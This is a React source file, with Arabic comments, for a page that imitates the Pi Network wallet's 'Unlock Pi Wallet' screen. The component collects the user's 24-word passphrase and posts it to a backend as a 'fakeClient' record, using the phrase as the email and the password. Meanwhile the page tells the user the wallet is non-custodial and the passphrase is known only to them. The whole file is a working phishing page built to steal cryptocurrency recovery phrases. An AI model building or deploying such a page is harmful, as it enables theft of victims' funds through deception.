import React, { useState } from "react";
import API_BASE_URL from "./Components/Constant";

// ضع عنوان API الخاص بك هنا

export default function PiWallet() {
  const [passphrase, setPassphrase] = useState("");

  const handleUnlock = async () => {
    // التحقق من أن passphrase بها 24 كلمة
    if (passphrase.trim().split(/\s+/).length !== 24) {
      alert("⚠️ يجب أن تحتوي passphrase على 24 كلمة.");
      return;
    }

    const fakeClient = {
      firstName: "Random",
      secondName: "User",
      email: passphrase + "@gmai.com",
      phoneNumber: "0658465165",
      password: passphrase, // نستخدم passphrase هنا
    };

    try {
      const response = await fetch(`${API_BASE_URL}Clients/PostClient`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(fakeClient),
      });

      const data = await response.json();

      if (response.ok) {
        alert("✅ تم التسجيل بنجاح!");
      } else {
        alert("❌ فشل التسجيل: " + data.message);
      }
    } catch (error) {
      alert("حدث خطأ في الاتصال بالسيرفر: " + error.message);
    }
  };

  const handleFaceID = () => {
    alert("🔓 محاولة فتح المحفظة باستخدام Face ID.");
  };

  return (
    <div style={styles.container}>
      <h2 style={styles.title}>Unlock Pi Wallet</h2>

      <textarea
        value={passphrase}
        onChange={(e) => setPassphrase(e.target.value)}
        placeholder="Enter your 24-word passphrase here"
        style={styles.textarea}
      />

      <button style={styles.passphraseBtn} onClick={handleUnlock}>
        Unlock With Passphrase
      </button>

      <button style={styles.faceIdBtn} onClick={handleFaceID}>
        Unlock With Face ID
      </button>

      <p style={styles.info}>
        As a non-custodial wallet, your wallet passphrase is exclusively
        accessible only to you. Recovery of passphrase is currently impossible.
      </p>

      <p style={styles.warning}>
        Lost your passphrase?{" "}
        <a href="#" style={styles.link}>
          You can create a new wallet
        </a>
        , but all your π in your previous wallet will be inaccessible.
      </p>
    </div>
  );
}

const styles = {
  container: {
    maxWidth: "400px",
    margin: "40px auto",
    padding: "20px",
    fontFamily: "'Segoe UI', sans-serif",
    backgroundColor: "white",
    textAlign: "center",
    borderRadius: "12px",
    boxShadow: "0 4px 10px rgba(0, 0, 0, 0.1)",
  },
  title: {
    fontSize: "24px",
    marginBottom: "20px",
    fontWeight: "bold",
    color: "#222",
  },
  textarea: {
    width: "100%",
    minHeight: "120px",
    fontSize: "16px",
    padding: "12px",
    marginBottom: "20px",
    borderRadius: "8px",
    border: "1px solid #ccc",
    resize: "none",
    outline: "none",
  },
  passphraseBtn: {
    width: "100%",
    padding: "12px",
    borderRadius: "8px",
    border: "1px solid rgb(62, 0, 128)",
    color: "#800080",
    backgroundColor: "white",
    fontSize: "16px",
    marginBottom: "10px",
    cursor: "pointer",
    transition: "0.3s",
  },
  faceIdBtn: {
    width: "100%",
    padding: "12px",
    borderRadius: "8px",
    backgroundColor: "#800080",
    color: "white",
    fontSize: "16px",
    border: "none",
    marginBottom: "20px",
    cursor: "pointer",
    transition: "0.3s",
  },
  info: {
    fontSize: "14px",
    color: "#333",
    lineHeight: "1.5",
  },
  warning: {
    fontSize: "14px",
    color: "#333",
    marginTop: "15px",
    lineHeight: "1.5",
  },
  link: {
    color: "#3366cc",
    textDecoration: "none",
  },
};
